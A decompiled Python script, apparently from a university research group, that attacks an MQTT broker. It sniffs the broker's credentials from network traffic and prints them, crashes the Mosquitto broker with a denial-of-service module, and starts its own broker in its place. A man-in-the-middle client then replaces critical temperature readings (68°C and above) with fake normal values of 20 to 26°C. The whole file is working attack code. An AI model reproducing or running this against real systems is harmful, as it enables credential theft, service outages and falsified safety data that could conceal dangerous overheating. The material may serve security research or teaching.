# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.6 (default, Sep 25 2020, 09:36:53) 
# [GCC 10.2.0]
# Embedded file name: framework.py
# Compiled at: 2020-09-03 13:20:10
# Size of source mod 2**32: 8835 bytes
"""
framework.py, launches a given number of mqtt-subscribers
which connect to a broker to crash it.
As soon as the broker seems to be no longer running,
mosquitto is launched from here on the given port

@author: tzimmermann @ AG Verteilte Systeme, Uni Osnabrueck
@date: 19.03.2018
@author: atessmer @ AG Verteilte Systeme, Uni Osnabrueck
@date: 03.09.2020
"""
import paho.mqtt.client as mqtt
import paho.mqtt.publish as publish
import time, argparse, sniffer_raw_socket, broker_wrapper, dos, random

class MosquittoCrasher:
    __doc__ = '\n    Constructor sets up a mosquitto-crasher and MITM-Attack\n    @param hostname: Hostname or IP of the broker\n    @param port: Port of the broker\n    '

    def __init__(self, hostname, port, verbose):
        self.hostname = hostname
        self.port = port
        self.verbose = verbose
        self.credentials = (None, None)
        self.serverProcess = None
        self.MITMClients = (None, None)
        self.stateCrashed = False
        self.stateFoundCredentials = False

    def startMITMClients(self):
        username, password = self.credentials
        subscriber = mqtt.Client('fakerSubscriber')
        subscriber.username_pw_set(username, password)
        subscriber.connect_async(self.hostname, self.port)
        subscriber.on_connect = self.on_subscriber_connect
        subscriber.on_message = self.cb_on_message
        subscriber.loop_start()
        publisher = None
        self.MITMClients = (subscriber, publisher)

    def on_subscriber_connect(self, client, userdata, flags, rc):
        client.subscribe('#')
        print('MITM-Subscriber connected')

    def on_publisher_connect(self, client, userdata, flags, rc):
        print('MITM-Publisher connected')

    def cb_on_message(self, client, userdata, msg):
        subscriber, publisher = self.MITMClients
        username, password = self.credentials
        try:
            temp = float(msg.payload)
            if temp >= 68:
                alt_temp = random.uniform(20, 26)
                print('Critical temperature of {:.2f}°C received, altering to {:.2f}°C'.format(temp, alt_temp))
                publish.single((msg.topic), alt_temp,
                  hostname='127.0.0.1',
                  port=(self.port + 1),
                  auth={'username':username, 
                 'password':password})
            else:
                print('Temperature of {:.2f}°C received, pass through'.format(temp))
                publish.single((msg.topic), (msg.payload),
                  hostname='127.0.0.1',
                  port=(self.port + 1),
                  auth={'username':username, 
                 'password':password})
        except Exception as e:
            try:
                print(str(e))
            finally:
                e = None
                del e

    def startServer(self):
        if self.serverProcess is None:
            self.serverProcess = broker_wrapper.Mosquitto(self.port, [self.credentials], self.verbose)
            self.serverProcess.start()
            time.sleep(1)

    def process_notYetCrashed(self):
        print('Crashing…')
        instance = dos.MQTT_DoS(self.hostname, self.port, self.credentials)
        instance.run()
        self.stateCrashed = True

    def process_seemsCrashed(self):
        if self.serverProcess is None:
            print('(Re)Start MITM Broker')
            self.startServer()
            time.sleep(5)
        if self.serverProcess.isRunning():
            pass
        else:
            self.serverProcess = None
            self.stateCrashed = False
            return
            subscriber, publisher = self.MITMClients
            if subscriber is None:
                self.startMITMClients()

    def process_findCredentials(self):
        print('Sniffing…')
        instance = sniffer_raw_socket.Sniffer(self.hostname, self.port)
        while True:
            time.sleep(1)
            if instance.status == 1:
                self.credentials = (
                 instance.user, instance.password)
                print('!Found Credentials!:')
                print('User: ' + instance.user)
                print('Password: ' + instance.password)
                self.stateFoundCredentials = True
                break

    def start(self):
        while True:
            time.sleep(1)
            if not self.stateFoundCredentials:
                self.process_findCredentials()
            elif not self.stateCrashed:
                self.process_notYetCrashed()
            else:
                self.process_seemsCrashed()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Launches many moqtt-subscribers to crash the broker and launches a new one')
    parser.add_argument('--broker', '-b', help='hostname or ip of the broker to connect to',
      default='localhost')
    parser.add_argument('--port', '-p', help='port of the broker',
      default='1883',
      type=int)
    parser.add_argument('--verbose', '-v', help='Enable Mosquitto output', action='store_true')
    args = parser.parse_args()
    crasher = MosquittoCrasher(args.broker, args.port, args.verbose)
    crasher.start()
# okay decompiling framework.pyc
